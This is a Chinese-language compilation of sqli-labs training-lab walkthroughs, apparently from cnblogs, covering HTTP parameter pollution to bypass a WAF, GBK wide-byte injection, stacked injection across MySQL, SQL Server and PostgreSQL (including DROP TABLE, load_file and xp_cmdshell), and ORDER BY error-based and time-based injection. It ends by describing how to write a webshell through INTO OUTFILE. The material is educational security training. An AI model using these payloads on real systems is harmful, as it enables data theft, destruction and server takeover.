服务器端有两个部分：第一部分为tomcat为引擎的jsp型服务器，第二部分为apache为引擎的php服务器，真正提供web服务的是php服务器。工作流程为：client访问服务器，能直接访问到tomcat服务器，然后tomcat服务器再向apache服务器请求数据。数据返回路径则相反。

此处简单介绍一下相关环境的搭建。环境为ubuntu14.04。此处以我搭建的环境为例，我们需要下载三个东西：tomcat服务器、jdk、mysql-connector-java.分别安装，此处要注意jdk安装后要export环境变量，mysql-connector-java需要将jar文件复制到jdk的相关目录中。接下来将tomcat-files.zip解压到tomcat服务器webapp/ROOT目录下，此处需要说明的是需要修改源代码中正确的路径和mysql用户名密码。到这里我们就可以正常访问29-32关了。

重点：index.php?id=1&id=2，你猜猜到底是显示id=1的数据还是显示id=2的？

Explain：apache（php）解析最后一个参数，即显示id=2的内容。Tomcat（jsp）解析第一个参数，即显示id=1的内容。

![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimages2015.cnblogs.com%2Fblog%2F669054%2F201608%2F669054-20160811222209187-1070797218.png)

以上图片为大多数服务器对于参数解析的介绍。

此处我们想一个问题：index.jsp?id=1&id=2请求，针对第一张图中的服务器配置情况，客户端请求首先过tomcat，tomcat解析第一个参数，接下来tomcat去请求apache（php）服务器，apache解析最后一个参数。那最终返回客户端的应该是哪个参数？

Answer：此处应该是id=2的内容，应为时间上提供服务的是apache（php）服务器，返回的数据也应该是apache处理的数据。而在我们实际应用中，也是有两层服务器的情况，那为什么要这么做？是因为我们往往在tomcat服务器处做数据过滤和处理，功能类似为一个WAF。而正因为解析参数的不同，我们此处可以利用该原理绕过WAF的检测。该用法就是HPP（HTTP Parameter Pollution），http参数污染攻击的一个应用。HPP可对服务器和客户端都能够造成一定的威胁。

[查看原网页: www.cnblogs.com](https://www.cnblogs.com/lcamry/p/5762961.html)


# 宽字节注入



Less-32,33,34,35,36,37六关全部是针对'和\\的过滤，所以我们放在一起来进行讨论。

对宽字节注入的同学应该对这几关的bypass方式应该比较了解。我们在此介绍一下宽字节注入的原理和基本用法。

原理：mysql在使用GBK编码的时候，会认为两个字符为一个汉字，例如%aa%5c就是一个汉字（前一个ascii码大于128才能到汉字的范围）。我们在过滤 ' 的时候，往往利用的思路是将 ' 转换为 \\' （转换的函数或者思路会在每一关遇到的时候介绍）。

因此我们在此想办法将 ' 前面添加的 \\ 除掉，一般有两种思路：

1.  %df吃掉 \\ 具体的原因是urlencode('\\) = %5c%27，我们在%5c%27前面添加%df，形成%df%5c%27，而上面提到的mysql在GBK编码方式的时候会将两个字节当做一个汉字，此事%df%5c就是一个汉字，%27则作为一个单独的符号在外面，同时也就达到了我们的目的。
    
2.  将 \\' 中的 \\ 过滤掉，例如可以构造 %\*\*%5c%5c%27的情况，后面的%5c会被前面的%5c给注释掉。这也是bypass的一种方法。
    

[查看原网页: www.cnblogs.com](https://www.cnblogs.com/lcamry/p/5762943.html)

# stacked injection


Stacked injections:堆叠注入。从名词的含义就可以看到应该是一堆sql语句（多条）一起执行。而在真实的运用中也是这样的，我们知道在mysql中，主要是命令行中，每一条语句结尾加 ; 表示语句结束。这样我们就想到了是不是可以多句一起使用。这个叫做stacked injection。

### 0x01 原理介绍

在SQL中，分号（;）是用来表示一条sql语句的结束。试想一下我们在 ; 结束一个sql语句后继续构造下一条语句，会不会一起执行？因此这个想法也就造就了堆叠注入。而union injection（联合注入）也是将两条语句合并在一起，两者之间有什么区别么？区别就在于union 或者union all执行的语句类型是有限的，可以用来执行查询语句，而堆叠注入可以执行的是任意的语句。

例如以下这个例子。

![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimages2015.cnblogs.com%2Fblog%2F669054%2F201608%2F669054-20160811220533906-1304680635.png)

当执行查询后，第一条显示查询信息，第二条则将整个表进行删除。

### 0x02 堆叠注入的局限性

堆叠注入的局限性在于并不是每一个环境下都可以执行，可能受到API或者数据库引擎不支持的限制，当然了权限不足也可以解释为什么攻击者无法修改数据或者调用一些程序。

![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimages2015.cnblogs.com%2Fblog%2F669054%2F201608%2F669054-20160811220534984-271396471.png)

Ps：此图是从原文中截取过来的，因为我个人的测试环境是php+mysql，是可以执行的，此处对于mysql/php存在质疑。但个人估计原文作者可能与我的版本的不同的原因。

虽然我们前面提到了堆叠查询可以执行任意的sql语句，但是这种注入方式并不是十分的完美的。在我们的web系统中，因为代码通常只返回一个查询结果，因此，堆叠注入第二个语句产生错误或者结果只能被忽略，我们在前端界面是无法看到返回结果的。

因此，在读取数据时，我们建议使用union（联合）注入。同时在使用堆叠注入之前，我们也是需要知道一些数据库相关信息的，例如表名，列名等信息。

### 0x03 各个数据库实例介绍

本节我们从常用数据库角度出发，介绍几个类型的数据库的相关用法。数据库的基本操作，增删查改。以下列出数据库相关堆叠注入的基本操作。

**Mysql数据库**

**（1）**新建一个表 select \* from users where id=1;create table test like users;

![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimages2015.cnblogs.com%2Fblog%2F669054%2F201608%2F669054-20160811220536531-1936838385.png)

执行成功，我们再去看一下是否新建成功表。

![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimages2015.cnblogs.com%2Fblog%2F669054%2F201608%2F669054-20160811220538437-1884969952.png)

1.  删除上面新建的test表select \* from users where id=1;drop table test;
    
    ![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimages2015.cnblogs.com%2Fblog%2F669054%2F201608%2F669054-20160811220539609-885310354.png)
    
    ![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimages2015.cnblogs.com%2Fblog%2F669054%2F201608%2F669054-20160811220541437-1858139281.png)
    
2.  查询数据select \* from users where id=1;select 1,2,3;
    
    ![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimages2015.cnblogs.com%2Fblog%2F669054%2F201608%2F669054-20160811220542718-2047461654.png)
    
    加载文件 select \* from users where id=1;select load\_file('c:/tmpupbbn.php');
    
    ![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimages2015.cnblogs.com%2Fblog%2F669054%2F201608%2F669054-20160811220544484-1762423717.png)
    
3.  修改数据select \* from users where id=1;insert into users(id,username,password)
    
    values('100','new','new');
    
    ![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimages2015.cnblogs.com%2Fblog%2F669054%2F201608%2F669054-20160811220546015-721343428.png)
    
    ![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimages2015.cnblogs.com%2Fblog%2F669054%2F201608%2F669054-20160811220547453-2113136530.png)
    
    **Sql server数据库**
    
4.  增加数据表select \* from test;create table sc3(ss CHAR(8));
    
    ![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimages2015.cnblogs.com%2Fblog%2F669054%2F201608%2F669054-20160811220548875-1183247003.png)
    
5.  删除数据表select \* from test;drop table sc3;
    
    ![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimages2015.cnblogs.com%2Fblog%2F669054%2F201608%2F669054-20160811220550125-1740565029.png)
    
    (3)查询数据select 1,2,3;select \* from test;
    
    ![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimages2015.cnblogs.com%2Fblog%2F669054%2F201608%2F669054-20160811220550687-159716018.png)
    
6.  修改数据select \* from test;update test set name\='test' where id=3;
    
    ![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimages2015.cnblogs.com%2Fblog%2F669054%2F201608%2F669054-20160811220551984-1696610695.png)![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimages2015.cnblogs.com%2Fblog%2F669054%2F201608%2F669054-20160811220554171-277866184.png)
    
7.  sqlserver中最为重要的存储过程的执行
    
    select \* from test where id\=1;exec master..xp\_cmdshell 'ipconfig'
    
    ![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimages2015.cnblogs.com%2Fblog%2F669054%2F201608%2F669054-20160811220556437-1467807017.png)
    
    **Oracle数据库**
    
    上面的介绍中我们已经提及，oracle不能使用堆叠注入，可以从图中看到，当有两条语句在同一行时，直接报错。无效字符。后面的就不往下继续尝试了。
    
    ![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimages2015.cnblogs.com%2Fblog%2F669054%2F201608%2F669054-20160811220558296-147337143.png)
    
    **Postgresql数据库**
    
8.  新建一个表 select \* from user\_test;create table user\_data(id DATE);
    
    ![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimages2015.cnblogs.com%2Fblog%2F669054%2F201608%2F669054-20160811220559593-1531546111.png)
    
    ![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimages2015.cnblogs.com%2Fblog%2F669054%2F201608%2F669054-20160811220600140-374048179.png)
    
    可以看到user\_data表已经建好。
    
9.  删除上面新建的user\_data表select \* from user\_test;delete from user\_data;
    
    ![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimages2015.cnblogs.com%2Fblog%2F669054%2F201608%2F669054-20160811220602000-616054728.png)
    
10.  查询数据select \* from user\_test;select 1,2,3;
    
    ![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimages2015.cnblogs.com%2Fblog%2F669054%2F201608%2F669054-20160811220604187-1946524207.png)
    
11.  修改数据 select \* from user\_test;update user\_test set name='modify' where name='张三'; ![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimages2015.cnblogs.com%2Fblog%2F669054%2F201608%2F669054-20160811220606312-2134459482.png)
    

[查看原网页: www.cnblogs.com](https://www.cnblogs.com/lcamry/p/5762905.html)
# order by



## Less-46

从本关开始，我们开始学习order by 相关注入的知识。

本关的sql语句为 s q l \=" S E L E C T ∗ F R O M u s e r s O R D E R B Y id";

尝试?sort=1 desc或者asc，显示结果不同，则表明可以注入。（升序or降序排列）

从上述的sql语句中我们可以看出，我们的注入点在order by后面的参数中，而order by不同于的我们在where后的注入点，不能使用union等进行注入。如何进行order by的注入，我们先来了解一下mysql官方select的文档。

![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimages2015.cnblogs.com%2Fblog%2F669054%2F201608%2F669054-20160811214206968-1040995908.png)

我们可利用order by后的一些参数进行注入。

首先

（1）、order by 后的数字可以作为一个注入点。也就是构造order by 后的一个语句，让该语句执行结果为一个数，我们尝试

[http://127.0.0.1/sqli-labs/Less-46/?sort=right(version(),1)](http://127.0.0.1/sqli-labs/Less-46/?sort=right(version(),1)%EF%BC%8C)

没有报错，但是right换成left都一样，说明数字没有起作用，我们考虑布尔类型。此时我们可以用报错注入和延时注入。

此处可以直接构造 ?sort= 后面的一个参数。此时，我们可以有三种形式，

①直接添加注入语句，?sort=(select \*\*\*\*\*\*)

②利用一些函数。例如rand()函数等。?sort=rand(sql语句)

Ps：此处我们可以展示一下rand(ture)和rand(false)的结果是不一样的。

![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimages2015.cnblogs.com%2Fblog%2F669054%2F201608%2F669054-20160811214208484-226735019.png)

![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimages2015.cnblogs.com%2Fblog%2F669054%2F201608%2F669054-20160811214209828-233732306.png)

③利用and，例如?sort=1 and (加sql语句)。

同时，sql语句可以利用报错注入和延时注入的方式，语句我们可以很灵活的构造。

**报错注入例子**


```
[http://127.0.0.1/sqli-labs/Less-46/?sort=(select%20count(\*)%20from%20information\_schema.columns%20group%20by%20concat(0x3a,0x3a,(select%20user()),0x3a,0x3a,floor(rand()\*2)))](http://127.0.0.1/sqli-labs/Less-46/?sort=(select%20count(*)%20from%20information_schema.columns%20group%20by%20concat(0x3a,0x3a,(select%20user()),0x3a,0x3a,floor(rand()*2))))
```


![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimages2015.cnblogs.com%2Fblog%2F669054%2F201608%2F669054-20160811214212515-1640673456.png)

上述例子，可以看到root@localhost的用户名

接下来我们用rand()进行演示一下，因为上面提到rand(true)和 rand(false)结果是不一样的。

http://127.0.0.1/sqli-labs/Less-46/?sort=rand(ascii(left(database(),1))=115)

![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimages2015.cnblogs.com%2Fblog%2F669054%2F201608%2F669054-20160811214214453-318205128.png)

http://127.0.0.1/sqli-labs/Less-46/?sort=rand(ascii(left(database(),1))=116)

![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimages2015.cnblogs.com%2Fblog%2F669054%2F201608%2F669054-20160811214216296-1391834321.png)

从上述两个图的结果，对比rand(ture)和rand(false)的结果，可以看出报错注入是成功的。

**延时注入例子**

[http://127.0.0.1/sqli-labs/Less-46/?sort=%20(SELECT%20IF(SUBSTRING(current,1,1)=CHAR(115),BENCHMARK(50000000,md5(%271%27)),null)%20FROM%20(select%20database()%20as%20current)%20as%20tb1)](http://127.0.0.1/sqli-labs/Less-46/?sort=%20(SELECT%20IF(SUBSTRING(current,1,1)=CHAR(115),BENCHMARK(50000000,md5(%271%27)),null)%20FROM%20(select%20database()%20as%20current)%20as%20tb1))

[http://127.0.0.1/sqllib/Less-46/?sort=1%20and%20If(ascii(substr(database(),1,1))=116,0,sleep(5))](http://127.0.0.1/sqllib/Less-46/?sort=1%20and%20If(ascii(substr(database(),1,1))=116,0,sleep(5)))

上述两个延时注入的例子可以很明显的看出时间的不同，这里就不贴图了，图片无法展示延时。。。

同时也可以用?sort=1 and 后添加注入语句。这里就不一一演示了。

1.  procedure analyse参数后注入
    
    利用procedure analyse参数，我们可以执行报错注入。同时，在procedure analyse和order by之间可以存在limit参数，我们在实际应用中，往往也可能会存在limit后的注入，可以利用procedure analyse进行注入。
    
    以下为示范例
    
    [http://127.0.0.1/sqli-labs/Less-46/?sort=1%20%20procedure%20analyse(extractvalue(rand(),concat(0x3a,version())),1)](http://127.0.0.1/sqli-labs/Less-46/?sort=1%20%20procedure%20analyse(extractvalue(rand(),concat(0x3a,version())),1))
    
    ![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimages2015.cnblogs.com%2Fblog%2F669054%2F201608%2F669054-20160811214219703-246276581.png)
    
2.  导入导出文件into outfile参数
    
    http://127.0.0.1/sqllib/Less-46/?sort=1%20into%20outfile%20%22c:\\\\wamp\\\\www\\\\sqllib\\\\test1.txt%22
    
    ![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimages2015.cnblogs.com%2Fblog%2F669054%2F201608%2F669054-20160811214221640-1879673458.png)
    
    将查询结果导入到文件当中
    
    ![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimages2015.cnblogs.com%2Fblog%2F669054%2F201608%2F669054-20160811214222718-942310005.png)
    
    那这个时候我们可以考虑上传网马，利用lines terminated by。
    
    Into outtfile c:\\\\wamp\\\\www\\\\sqllib\\\\test1.txt lines terminated by 0x(网马进行16进制转换)
    

[查看原网页: www.cnblogs.com](https://www.cnblogs.com/lcamry/p/5762710.html)